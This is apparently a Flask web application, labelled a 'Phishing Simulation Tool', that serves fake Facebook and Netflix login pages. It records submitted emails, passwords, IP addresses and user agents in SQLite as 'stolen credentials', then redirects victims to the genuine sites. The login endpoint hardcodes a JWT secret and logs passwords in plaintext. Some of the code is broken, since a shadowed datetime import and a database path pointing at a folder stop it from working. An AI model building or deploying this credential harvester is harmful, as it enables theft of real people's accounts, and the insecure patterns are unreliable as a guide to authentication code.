from flask import Flask, render_template, request, redirect, jsonify
from werkzeug.security import check_password_hash
import sqlite3
from datetime import datetime
import bcrypt
import logging
import jwt
import datetime
import logging
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

SECRET_KEY = 'my_great_token'  

DB_NAME = r"dbs"
DB_USERS = f"{DB_NAME}/users.db"

def init_db():
    """Initialize the SQLite database to store logs"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            page TEXT,
            username TEXT,
            password TEXT,
            ip TEXT,
            user_agent TEXT,
            timestamp TEXT
        )
    """)
    conn.commit()
    conn.close()

@app.route('/')
def home():
    """Landing page (could redirect to an actual site)"""
    return "Welcome to Phishing Simulation Tool"

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    """Fake Facebook login page"""
    if request.method == 'POST':
        print("Here")
        username = request.form.get('email')
        password = request.form.get('pass')

        log_credentials("Facebook", username, password)
        return redirect("https://www.facebook.com/") 
            
    return render_template('facebook/index.html')

@app.route('/netflix', methods=['GET', 'POST'])
def netflix():
    """Fake Netflix login page"""
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('password')
        log_credentials("Netflix", username, password)
        return redirect("https://www.netflix.com/")

    return render_template('netflix/index.html')

def log_credentials(page, username, password):
    """Log stolen credentials into SQLite database"""
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO credentials (page, username, password, ip, user_agent, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (page, username, password, ip, user_agent, timestamp))
    
    conn.commit()
    conn.close()


def check_credentials(username, password):
    """Check if the provided username and password match the database."""
    conn = sqlite3.connect(DB_USERS)
    cursor = conn.cursor()

    cursor.execute('SELECT username, password FROM users WHERE username = ?', (username,))
    user = cursor.fetchone()
    
    if user and bcrypt.checkpw(password.encode('utf-8'), user[1]):
        return True
    return False


@app.route('/login', methods=['POST'])
def login():
    """Authenticate the user and return a JWT token"""
    username = request.json.get('username')
    password = request.json.get('password')
    
    logging.info(f"Username: {username}, Password: {password}")
    print(check_credentials(username, password))
    if check_credentials(username, password):

        token = jwt.encode(
            {"username": username, "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)},
            SECRET_KEY,
            algorithm="HS256"
        )
        return jsonify({"status": "success", "message": "Login successful!", "token": token})
    else:
        return jsonify({"status": "fail", "message": "Invalid username or password!"}), 401

@app.route('/logout', methods=['POST'])
def logout():
    """Invalidate the user session"""
    # Assuming you're storing session data or tokens on the server, invalidate the session here
    # This could be done by removing the token from the database, blacklist the JWT, etc.
    
    # Example (pseudo-code):
    # remove_token_from_db(request.user) or blacklist_jwt(request.token)
    
    return jsonify({"status": "success", "message": "Logged out successfully"})

if __name__ == '__main__':
    # init_db()
    app.run(host='0.0.0.0', port=5000, debug=True)
